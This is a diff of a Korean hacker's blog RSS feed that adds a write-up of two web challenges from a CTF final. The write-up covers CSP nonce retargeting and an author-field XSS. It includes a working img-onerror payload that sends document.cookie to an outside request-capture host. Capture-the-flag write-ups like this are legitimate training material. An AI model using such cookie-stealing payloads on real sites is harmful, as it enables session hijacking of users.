@@ -1,4 +1,95 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>CCE Quals Write-Up</title><link>https://itznullbyte.github.io/posts/2025_cce/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/2025_cce/</guid><description>6th with Team: 해킹의 정석</description><pubDate>Tue, 19 Aug 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;img src=&quot;./scoreboard.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>2025 HackQuest Final Write-Up</title><link>https://itznullbyte.github.io/posts/hackquest_final/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/hackquest_final/</guid><description>4등</description><pubDate>Tue, 26 Aug 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;4등으로 마무리 했다 goldleo님이 3등으로 동점이지만 워낙 웹 고수셔서 크게 아쉽진 않다..&lt;br /&gt;
+더 어렵게 나왔으면 격차는 더 벌어졌을거다&lt;br /&gt;
+웹은 꽤 쉬웠고 올솔했다. 하나는 웹 같지가 않아서 2개만 write up 써보겠다&lt;/p&gt;
+&lt;h2&gt;Simple Gallery&lt;/h2&gt;
+&lt;p&gt;아이디어 생각해내기가 좀 까다로웠다&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;admin post에 플래그가 포함된 사진이 업로드 되어있다. 물론 어드민만 읽을 수 있다.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;로그인해서 글을 써보면 XSS 터지는 포인트가 크게 두 곳이 보이는데
+내용이랑 맨 위 알림창이다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://158.247.202.119/view/177?message=(페이로드)&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;app.use((req, res, next)=&amp;gt;{
+    nonce = crypto.randomBytes(32).toString(&apos;hex&apos;);
+    res.setHeader(&apos;Cache-Control&apos;, &apos;no-cache, no-store, must-revalidate&apos;);
+    res.setHeader(&apos;X-Frame-Options&apos;, &apos;deny&apos;);
+    res.setHeader(&apos;Content-Security-Policy&apos;, &apos;script-src \&apos;nonce-&apos; + nonce + &apos;\&apos;&apos;);
+    next();
+})
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;그러나 script-src가 걸려있어서 admin 쿠키를 탈취해 해결하긴 어려워보인다&lt;/p&gt;
+&lt;p&gt;CSP에 base-uri 관련 설정이 들어있지 않다는 점을 이용해 base 태그를 사용한 nonce retargeting이 가능하다&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;const flagImageName = crypto.randomBytes(32).toString(&apos;hex&apos;) + &apos;.png&apos;;
+const flagImagePath = path.join(&apos;uploads&apos;, flagImageName);
+
+fs.copyFileSync(&apos;flag.png&apos;, flagImagePath);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;위 코드에서 알 수 있듯이 랜덤화된 플래그 파일명만 알면 어드민이 아니어도 접근할 수 있으므로 아래와 같이 시나리오를 짰다&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;게시글 본문 XSS로 meta tag open redirect&lt;/li&gt;
+&lt;li&gt;admin 게시글로 이동 후 message query에서 nonce retargeting&lt;/li&gt;
+&lt;li&gt;admin 게시글의 플래그 이미지 로드 시 retargeting 된 웹훅으로 요청 &lt;code&gt;https://webhook/{flag파일명}&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&quot;./img4.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;./img5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;해당 경로로 접속하면 플래그를 얻을 수 있다&lt;/p&gt;
+&lt;h2&gt;Simple Board&lt;/h2&gt;
+&lt;p&gt;코드양이 좀 되어서 겁먹었는데 진짜 별 거 없었다&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;app.get(&apos;/post/:id&apos;, requireAuth, async (req, res) =&amp;gt; {
+  const id = req.params.id;
+  const post = postDB.get(id);
+  if (!post) return res.status(404).send(&apos;Not Found&apos;);
+  if (post.author !== req.session.user.username &amp;amp;&amp;amp; !(req.session.user &amp;amp;&amp;amp; req.session.user.role === &apos;admin&apos;)) {
+    return res.status(403).send(&apos;Forbidden&apos;);
+  }
+  const { uneval } = await import(&apos;devalue&apos;);
+  const postSerialized = filter(uneval(post));
+  const meSerialized = filter(uneval({ username: req.session.user.username, role: req.session.user.role }));
+
+  res.render(&apos;post&apos;, { user: getUser(req), postSerialized, meSerialized });
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;devalue라는 모듈을 사용해서 이상한 문자열들을 다 필터링 해버린다.&lt;br /&gt;
+우회하려고 삽질 좀 했는데 취약점은 상상도 못한곳에서 터진다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if (postRoot &amp;amp;&amp;amp; window.__POST) {
+  const p = window.__POST;
+  const h1 = document.createElement(&apos;h1&apos;);
+  h1.textContent = p.title;
+
+  const meta = document.createElement(&apos;div&apos;);
+  meta.className = &apos;post-meta&apos;;
+  const who = document.createElement(&apos;span&apos;);
+  who.innerHTML = `작성자: &amp;lt;b&amp;gt;${p.author}&amp;lt;/b&amp;gt;`;
+  const when = document.createElement(&apos;span&apos;);
+  when.textContent = `작성시간: ${fmtDate(p.createdAt)}`;
+  meta.appendChild(who);
+  meta.appendChild(when);
+
+  const pre = document.createElement(&apos;pre&apos;);
+  pre.className = &apos;post-content&apos;;
+  highlightText(pre, p.content, p.highlight);
+
+  const tagsWrap = setToChips(p.tags);
+  const details = mapToList(p.meta);
+
+  postRoot.appendChild(h1);
+  postRoot.appendChild(meta);
+  postRoot.appendChild(pre);
+  postRoot.appendChild(tagsWrap);
+  postRoot.appendChild(details);
+
+  const delForm = document.getElementById(&apos;delete-form&apos;);
+  if (delForm) delForm.action = `/delete/${p.id}`;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;작성자를 넣을 때는 그대로 innerHTML 하게되어서 아이디로 xss가 발생한다&lt;/p&gt;
+&lt;p&gt;그 다음은 간단한 XSS다. 페이로드 들어간거보면 문자 몇 개는 제거되니 주의하자. 왜 그런지는 모르겠다&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;img src=x onload=fetch(&quot;https://tkpfwcr.request.dreamhack.games?q=&quot;+document.cookie) onerror=fetch(&quot;https://tkpfwcr.request.dreamhack.games?q=&quot;+document.cookie) /&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;어드민 봇한테 주고 플래그 따면 끝&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://158.247.202.119:3000/flag&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag: hackquest2025{2522482579226696ac9def67ab04c98c}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>CCE Quals Write-Up</title><link>https://itznullbyte.github.io/posts/2025_cce/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/2025_cce/</guid><description>6th with Team: 해킹의 정석</description><pubDate>Tue, 19 Aug 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;img src=&quot;./scoreboard.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;YISF 본선 전날에 CCE 예선을 나갔다.&lt;br /&gt;
 해킹의 정석팀으로 참여해서 6등으로 본선을 가게 되었다.&lt;br /&gt;
 올해 목표가 메이저 대회 본선 진출과 수상이었는데 비록 코게는 못갔지만 CCE 본선에 갈 수 있게 되어 다행이다&lt;/p&gt;
@@ -1196,7 +1287,7 @@ https://katalk.kakao.com/win32/account/register_device.json&lt;/p&gt;
 체감상 지금까지 코드게이트 문제들중에 웹이 제일 어려웠던거 같다&lt;br /&gt;
 끝나기 4시간 전까지 스코어보드에 내 닉네임이 나오고 있었기에 기대감을 품고 있긴 했는데, 역시.. 후반에 쭉 밀려서 31등까지 떨어졌다.&lt;/p&gt;
 &lt;p&gt;하지만 풀이자가 얼마없던 Token rush를 풀었고, Masquerade도 어느 정도 접근했었기 때문에 확실히 성장한 게 느껴져서 좋았다.&lt;/p&gt;
-&lt;p&gt;몇 달 뒤 있는 CCE는 본선 가고싶다&lt;/p&gt;
+&lt;p&gt;몇 달 뒤 있는 CCE는 본선 가고싶다 (+ 갔다)&lt;/p&gt;
 &lt;h2&gt;Write-Up&lt;/h2&gt;
 &lt;h3&gt;Hello Codegate&lt;/h3&gt;
 &lt;p&gt;&lt;img src=&quot;./hello_codegate.png&quot; alt=&quot;&quot; /&gt;
@@ -1592,8 +1683,8 @@ await button.click();
 &lt;p&gt;주니어부 0솔까지 갈 정도로 어려웠던 문제는 아니었던거 같은데 0솔인건 좀 의문이다&lt;/p&gt;
 &lt;p&gt;확실히 CSP랑 dompurify에 대한 지식이 거의 없었어서 문제의도 파악이 어려웠던거 같다. 공부해야겠다&lt;/p&gt;
 </content:encoded></item><item><title>SSU CTF 2025 Write-Up</title><link>https://itznullbyte.github.io/posts/ssuctf/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/ssuctf/</guid><description>Overall 28th, General 17th</description><pubDate>Sun, 26 Jan 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Comment&lt;/h2&gt;
-&lt;p&gt;어려웠다.. 웹에서 처음보는 기법들이 많이 나와서 손도 못댔다&lt;br /&gt;
-비교적 쉽게 나온 다른 분야 몇문제만 풀었다. 팀원들이 잘해줘서 생각보다 잘 나온거 같다.
+&lt;p&gt;어려웠다.. 청소년부가 따로 없어서 성인분들이랑 같이 해야했고 웹에서 처음보는 기법들이 많이 나와서 손도 못댔다&lt;br /&gt;
+비교적 쉽게 나온 다른 분야 몇 문제만 풀었다. 팀원들이 잘해줘서 생각보다 잘 나온거 같다.
 100점짜리 문제는 올솔브했다&lt;/p&gt;
 &lt;h2&gt;Solve&lt;/h2&gt;
 &lt;ul&gt;
